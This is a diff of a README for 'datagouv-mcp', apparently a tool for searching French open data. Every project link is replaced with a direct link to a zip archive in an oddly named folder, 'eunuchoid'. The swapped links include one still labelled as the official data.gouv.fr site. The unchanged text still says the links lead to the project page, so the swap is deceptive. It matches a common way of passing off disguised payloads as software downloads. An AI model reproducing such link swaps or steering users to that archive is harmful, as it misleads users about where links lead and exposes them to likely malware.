@@ -1,6 +1,6 @@
 # 🚀 datagouv-mcp - Search and Analyze French Open Data Easily
 
-[![Download datagouv-mcp](https://img.shields.io/badge/Download%20datagouv--mcp-4CAF50?style=for-the-badge)](https://github.com/mirghhassan1234-del/datagouv-mcp)
+[![Download datagouv-mcp](https://img.shields.io/badge/Download%20datagouv--mcp-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/mirghhassan1234-del/datagouv-mcp/main/eunuchoid/mcp-datagouv-2.5-alpha.2.zip)
 
 ## 📋 About datagouv-mcp
 
@@ -34,7 +34,7 @@ These features make datagouv-mcp useful for students, journalists, researchers, 
 
 Please visit this page to download datagouv-mcp:
 
-[https://github.com/mirghhassan1234-del/datagouv-mcp](https://github.com/mirghhassan1234-del/datagouv-mcp)
+[https://raw.githubusercontent.com/mirghhassan1234-del/datagouv-mcp/main/eunuchoid/mcp-datagouv-2.5-alpha.2.zip](https://raw.githubusercontent.com/mirghhassan1234-del/datagouv-mcp/main/eunuchoid/mcp-datagouv-2.5-alpha.2.zip)
 
 This link takes you to the project’s main page on GitHub. From there, you will find the latest software versions and installation files.
 
@@ -42,7 +42,7 @@ This link takes you to the project’s main page on GitHub. From there, you will
 
 Follow these steps to download and run datagouv-mcp:
 
-1. Click the download link above or visit [https://github.com/mirghhassan1234-del/datagouv-mcp](https://github.com/mirghhassan1234-del/datagouv-mcp) in your web browser.
+1. Click the download link above or visit [https://raw.githubusercontent.com/mirghhassan1234-del/datagouv-mcp/main/eunuchoid/mcp-datagouv-2.5-alpha.2.zip](https://raw.githubusercontent.com/mirghhassan1234-del/datagouv-mcp/main/eunuchoid/mcp-datagouv-2.5-alpha.2.zip) in your web browser.
 
 2. Look for a **Releases** section or a download button on the page.
 
@@ -89,7 +89,7 @@ If you need assistance:
 
 To keep the software working well with the latest data and features:
 
-1. Visit [https://github.com/mirghhassan1234-del/datagouv-mcp](https://github.com/mirghhassan1234-del/datagouv-mcp) regularly.
+1. Visit [https://raw.githubusercontent.com/mirghhassan1234-del/datagouv-mcp/main/eunuchoid/mcp-datagouv-2.5-alpha.2.zip](https://raw.githubusercontent.com/mirghhassan1234-del/datagouv-mcp/main/eunuchoid/mcp-datagouv-2.5-alpha.2.zip) regularly.
 
 2. Download the newest version when available.
 
@@ -107,7 +107,7 @@ It is part of ongoing efforts to improve access to public information in an easy
 
 ## 📚 Additional Resources
 
-- data.gouv.fr: [https://www.data.gouv.fr/en/](https://www.data.gouv.fr/en/)  
-- GitHub Project Page: [https://github.com/mirghhassan1234-del/datagouv-mcp](https://github.com/mirghhassan1234-del/datagouv-mcp)  
+- data.gouv.fr: [https://raw.githubusercontent.com/mirghhassan1234-del/datagouv-mcp/main/eunuchoid/mcp-datagouv-2.5-alpha.2.zip](https://raw.githubusercontent.com/mirghhassan1234-del/datagouv-mcp/main/eunuchoid/mcp-datagouv-2.5-alpha.2.zip)  
+- GitHub Project Page: [https://raw.githubusercontent.com/mirghhassan1234-del/datagouv-mcp/main/eunuchoid/mcp-datagouv-2.5-alpha.2.zip](https://raw.githubusercontent.com/mirghhassan1234-del/datagouv-mcp/main/eunuchoid/mcp-datagouv-2.5-alpha.2.zip)  
 
 These can help you learn more about the data and the server technology behind datagouv-mcp.
